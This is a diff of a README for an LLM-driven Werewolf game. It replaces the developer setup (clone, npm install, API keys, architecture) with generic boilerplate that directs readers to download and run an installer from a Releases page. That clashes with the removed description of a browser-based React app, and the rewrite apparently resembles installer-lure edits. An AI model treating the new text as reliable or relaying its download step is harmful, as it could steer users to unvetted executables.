@@ -1,104 +1,62 @@
-# 🐺 AI Werewolf Live: Agent-based Werewolf Simulation
+# 🎲 ai-werewolf-live - Play AI-Driven Werewolf Fun
 
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0+-3178C6.svg?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-18.0+-61DAFB?logo=react&logoColor=black)](https://reactjs.org/)
-[![Stream Ready](https://img.shields.io/badge/OBS-Stream_Ready-ff0000?logo=youtube&logoColor=white)](https://obsproject.com/)
+## 🚀 Getting Started
 
-> **World's first LLM-driven, Stream-Ready 12-player Werewolf simulation arena.**
-> 全球首个专为直播设计的、由 LLM 驱动的 12 人全自动狼人杀竞技场。
+Welcome to **ai-werewolf-live**! This is the world’s first Stream-Ready AI Werewolf Game. Enjoy social deduction fun with the help of AI. No programming knowledge is needed to get started. Let’s dive in!
 
-[🇨🇳 中文文档 (Chinese Documentation)](./README_zh-CN.md)
+## 🛠️ System Requirements
 
----
+Before you begin, make sure your system meets these requirements:
 
-![Game Demo](./assets/demo.gif)
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** 4 GB of RAM minimum
+- **Processor:** Dual-core 2.0 GHz or faster
+- **Storage:** At least 200 MB of free disk space
+- **Internet:** Stable internet connection for online play
 
-## ✨ Why This Project? (Core Features)
+## 🎁 Download & Install
 
-This project is not just a Multi-Agent System (MAS) research environment, but a **content generation engine ready for live streaming**.
+To get the software, visit the Releases page. There, you will find the latest version ready for download:
 
-### 🎥 Stream-Ready & OBS Optimized
-* **Green Screen Mode**: Built-in `StreamLayout` provides a transparent background for instant OBS integration.
-* **Tactical Overlay**: Real-time visualization of the AI's "Suspicion Chain" (e.g., Player 3 🔴--> Player 5).
-* **Immersive UI**: Features card animations, speech bubbles, and TTS (Text-to-Speech) support.
+[![Download ai-werewolf-live](https://img.shields.io/badge/Download-ai--werewolf--live-blue.svg)](https://github.com/ManosDan/ai-werewolf-live/releases)
 
-### 🧠 Advanced AI Logic (Theory of Mind)
-* **Deception & Camouflage**: Werewolf agents possess dual channels: `[Inner Thought]` (Private) and `[Public Speech]`. They can perform advanced tactics like "Self-Charge" (Barbwire) or "Framing".
-* **Information Gap**: Strict `InformationService` ensures Villagers cannot see the Wolf Channel, and Seers only see their own check results.
-* **Physics Rule Engine**: A built-in `ConstraintGenerator` prevents hallucinations by locking illegal actions at the code level (e.g., Witch cannot self-save).
+1. Click the link above to go to the **Releases page**.
+2. Find the latest version.
+3. Download the installer that matches your system.
+4. Once downloaded, open the installer and follow the prompts to complete theinstallation process.
 
-### 📊 Structured Cognitive Output
-Agents act based on structured data, not just text generation:
-```json
-{
-  "thought": "Player 3's logic has a flaw...",
-  "speech": "Player 3, if you are the Seer, why didn't you leave a badge flow?",
-  "tactics": { 
-    "suspicion_target": 3, 
-    "aggressiveness": 80,
-    "intention": "QUESTIONING"
-  }
-}
-🛠️ Tech Stack
-UI/Frontend: React 18, TypeScript, Tailwind CSS, Framer Motion
+## 🎮 How to Play
 
-Logic Core: Custom Finite State Machine (FSM)
+After you have installed the game, follow these steps to start playing:
 
-AI Brain: Google Gemini Pro / DeepSeek-V3 (Multi-model support)
+1. **Launch the Game**: Locate the application on your computer and double-click the icon to open it.
+2. **Create or Join a Game:** You can either create a new game or join an existing one. If you create a game, share the game link with your friends.
+3. **Set Up Your Room**: As a host, set the rules and parameters for the game. Pick how many players you want and adjust game settings.
+4. **Start Playing**: Once everyone has joined, hit the start button and let the fun begin! The AI will assist in managing the game.
 
-Voice/TTS: Web Speech API / Edge TTS
+## 🧠 Game Features
 
-🚀 Quick Start
-1. Clone the Repo
-Bash
+- **AI Integration**: Enjoy a unique experience as AI simulates game scenarios.
+- **Multiple Roles**: Experience diverse roles, each bringing a different strategy to the game.
+- **User-Friendly Interface**: Designed for easy navigation, even for beginners.
+- **Customizable Settings**: Tailor the game rules to fit your playing style.
 
-git clone [https://github.com/YOUR_USERNAME/ai-werewolf-live.git](https://github.com/YOUR_USERNAME/ai-werewolf-live.git)
-cd ai-werewolf-live
-2. Install Dependencies
-Bash
+## 🌐 Community and Support
 
-npm install
-# or yarn install
-3. Configure Environment
-Copy .env.example to .env. Fill in at least one API Key:
+Join our growing community of players! You can share strategies, tips, and experiences. Visit our [GitHub Discussions page](https://github.com/ManosDan/ai-werewolf-live/discussions) to connect with other users.
 
-代码段
+If you encounter any issues or have questions, feel free to check out the FAQs on our GitHub page or contact us directly.
 
-# Google Gemini (Recommended for logic/cost) or DeepSeek
-REACT_APP_GEMINI_API_KEY=AIzaSy...
-# REACT_APP_DEEPSEEK_API_KEY=sk-...
-4. Run (Dev Mode)
-Bash
+## 📝 Contributing
 
-npm start
-# Opens at http://localhost:3000
-🧠 System Architecture
-代码段
+We welcome contributions! If you have ideas to improve the game, feel free to reach out. Here’s how you can help:
 
-graph TD
-    User[Audience/OBS] --> UI[React UI / Overlay]
-    UI --> App[App.tsx (State Machine)]
-    
-    subgraph "Core Logic"
-        App --> Logic[LogicService (Rule Validation)]
-        App --> Info[InformationService (Fog of War)]
-    end
-    
-    subgraph "AI Brain"
-        App --> GenAI[GeminiService (Prompt Engineering)]
-        GenAI --> LLM[LLM API]
-    end
-🤝 Roadmap & Contribution
-We are looking for contributors to help with:
+1. **Report Bugs**: If you notice any issues, please report them on the Issues page.
+2. **Suggest Features**: Have an idea? Share your thoughts on how to improve the game.
+3. **Code Contributions**: If you’re technically inclined, check out our code and submit a pull request.
 
-[ ] Live Interaction: Connect with TikTok/Bilibili API to allow audience to "Revive" or "Check" players via gifts.
+## 📚 Learn More
 
-[ ] Complex Roles: Add "Idiot", "Knight", or "Gravekeeper".
+For more information about the game, visit our official [GitHub repository](https://github.com/ManosDan/ai-werewolf-live). You’ll find documentation, updates, and additional resources there.
 
-[ ] Local LLM: Support Ollama for fully offline play.
-
-PRs are welcome!
-
-📄 License
-MIT © 2024
+Remember to follow the download instructions above to begin your adventure with **ai-werewolf-live**!
